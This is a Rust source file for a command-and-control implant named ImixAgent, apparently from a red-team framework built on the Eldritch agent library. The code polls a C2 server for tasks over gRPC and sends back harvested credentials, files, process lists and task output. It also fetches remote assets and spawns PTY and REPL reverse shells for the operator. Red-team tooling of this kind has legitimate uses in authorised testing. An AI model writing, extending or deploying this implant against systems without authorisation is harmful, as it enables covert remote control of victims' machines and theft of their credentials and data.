use anyhow::{Context, Result};
use eldritch_libagent::agent::{Agent, Transport as AgentTransport, TaskManager, AgentConfig};
use pb::c2::{self, ClaimTasksRequest};
use pb::config::Config;
use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use tokio::sync::RwLock;
use transport::Transport;

use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
use crate::task::TaskRegistry;

#[derive(Clone)]
pub struct ImixAgent<T: Transport> {
    config: Arc<RwLock<Config>>,
    transport: Arc<RwLock<T>>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: Arc<TaskRegistry>,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
    pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
}

impl<T: Transport + 'static> ImixAgent<T> {
    pub fn new(
        config: Config,
        transport: T,
        runtime_handle: tokio::runtime::Handle,
        task_registry: Arc<TaskRegistry>,
    ) -> Self {
        Self {
            config: Arc::new(RwLock::new(config)),
            transport: Arc::new(RwLock::new(transport)),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
            output_buffer: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn get_callback_interval_u64(&self) -> u64 {
        // Blocks on read, but it's fast
        if let Ok(cfg) = self.config.try_read() {
            cfg.info.as_ref().map(|b| b.interval).unwrap_or(5)
        } else {
            5
        }
    }

    // Triggers config.refresh_primary_ip() in a write lock
    pub async fn refresh_ip(&self) {
        let mut cfg = self.config.write().await;
        cfg.refresh_primary_ip();
    }

    // Updates the shared transport with a new instance
    pub async fn update_transport(&self, t: T) {
        let mut transport = self.transport.write().await;
        *transport = t;
    }

    // Flushes all buffered task outputs using the provided transport (or internal one if not provided, but here we assume internal is set by main)
    pub async fn flush_outputs(&self) {
        // Drain the buffer
        let outputs: Vec<_> = {
            match self.output_buffer.lock() {
                Ok(mut b) => b.drain(..).collect(),
                Err(_) => return,
            }
        };

        if outputs.is_empty() {
            return;
        }

        #[cfg(debug_assertions)]
        log::info!("Flushing {} task outputs", outputs.len());

        let mut transport = self.transport.write().await;
        for output in outputs {
            if let Err(_e) = transport.report_task_output(output).await {
                #[cfg(debug_assertions)]
                log::error!("Failed to report task output: {_e}");
            }
        }
    }

    // Helper to get config URIs for creating new transport
    pub async fn get_transport_config(&self) -> (String, Option<String>) {
        let cfg = self.config.read().await;
        (cfg.callback_uri.clone(), cfg.proxy_uri.clone())
    }

    // Helper to get a usable transport.
    // If the shared transport is active, returns a clone of it.
    // If not, creates a new one from config.
    async fn get_usable_transport(&self) -> Result<T> {
        // 1. Check shared transport
        {
            let guard = self.transport.read().await;
            if guard.is_active() {
                return Ok(guard.clone());
            }
        }

        // 2. Create new transport from config
        let (callback_uri, proxy_uri) = self.get_transport_config().await;
        let t = T::new(callback_uri, proxy_uri).context("Failed to create on-demand transport")?;

        #[cfg(debug_assertions)]
        log::debug!("Created on-demand transport for background task");

        Ok(t)
    }

    // Helper to fetch tasks and return them, so main can spawn
    pub async fn fetch_tasks(&self) -> Result<Vec<pb::c2::Task>> {
        let mut transport = self.transport.write().await;
        let beacon_info = self.config.read().await.info.clone();
        let req = ClaimTasksRequest {
            beacon: beacon_info,
        };
        let response = transport
            .claim_tasks(req)
            .await
            .context("Failed to claim tasks")?;
        Ok(response.tasks)
    }

    // Helper to run a future on the runtime handle, blocking the current thread.
    fn block_on<F, R>(&self, future: F) -> Result<R, String>
    where
        F: std::future::Future<Output = Result<R, String>>,
    {
        self.runtime_handle.block_on(future)
    }
}

// Implement the Eldritch Agent Traits
impl<T: Transport + Send + Sync + 'static> AgentTransport for ImixAgent<T> {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        self.block_on(async {
            let mut t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;

            // Transport uses std::sync::mpsc::Sender for fetch_asset
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;

            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String> {
        self.block_on(async {
            let mut t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            t.report_credential(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
        self.block_on(async {
            let mut t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            // Transport uses std::sync::mpsc::Receiver for report_file
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req).map_err(|e| e.to_string())?;
            drop(tx);
            t.report_file(rx).await.map_err(|e| e.to_string())
        })
    }

    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String> {
        self.block_on(async {
            let mut t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            t.report_process_list(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_task_output(
        &self,
        req: c2::ReportTaskOutputRequest,
    ) -> Result<c2::ReportTaskOutputResponse, String> {
        // Buffer output instead of sending immediately
        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
        buffer.push(req);
        Ok(c2::ReportTaskOutputResponse {})
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
        // Direct claim tasks logic usually used internally or for chaining.
        // We use get_usable_transport here as well to be safe.
        self.block_on(async {
            let mut t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            t.claim_tasks(req).await.map_err(|e| e.to_string())
        })
    }
}

impl<T: Transport + Send + Sync + 'static> TaskManager for ImixAgent<T> {
    fn reverse_shell(&self) -> Result<(), String> {
        Err("Reverse shell not implemented in imixv2 agent yet".to_string())
    }

    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
        let subtasks = self.subtasks.clone();

        // Get usable transport (new or existing)
        let transport_clone =
            self.block_on(async { self.get_usable_transport().await.map_err(|e| e.to_string()) })?;

        let handle = self.runtime_handle.spawn(async move {
            if let Err(_e) = run_reverse_shell_pty(task_id, cmd, transport_clone).await {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty error: {_e}");
            }
        });

        // Store handle
        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }

    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
        let subtasks = self.subtasks.clone();
        let agent = self.clone();

        // Get usable transport (new or existing)
        let transport_clone =
            self.block_on(async { self.get_usable_transport().await.map_err(|e| e.to_string()) })?;

        let handle = self.runtime_handle.spawn(async move {
            if let Err(_e) = run_repl_reverse_shell(task_id, transport_clone, agent).await {
                #[cfg(debug_assertions)]
                log::error!("repl_reverse_shell error: {_e}");
            }
        });

        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }

    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
        Ok(self.task_registry.list())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.task_registry.stop(task_id);
        // Also stop subtask
        let mut map = self
            .subtasks
            .lock()
            .map_err(|_| "Poisoned lock".to_string())?;
        if let Some(handle) = map.remove(&task_id) {
            handle.abort();
            #[cfg(debug_assertions)]
            log::info!("Aborted subtask {task_id}");
        }
        Ok(())
    }
}

impl<T: Transport + Send + Sync + 'static> AgentConfig for ImixAgent<T> {
    fn get_transport(&self) -> Result<String, String> {
        Ok("grpc".to_string())
    }

    fn set_transport(&self, _transport: String) -> Result<(), String> {
        Err("Switching transport not supported yet".to_string())
    }

    fn add_transport(&self, _transport: String, _config: String) -> Result<(), String> {
        Err("Adding transport not supported yet".to_string())
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        Ok(vec!["grpc".to_string()])
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        Ok(self.get_callback_interval_u64())
    }

    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = &mut cfg.info {
                info.interval = interval;
            }
            Ok(())
        })
    }
}

impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {}
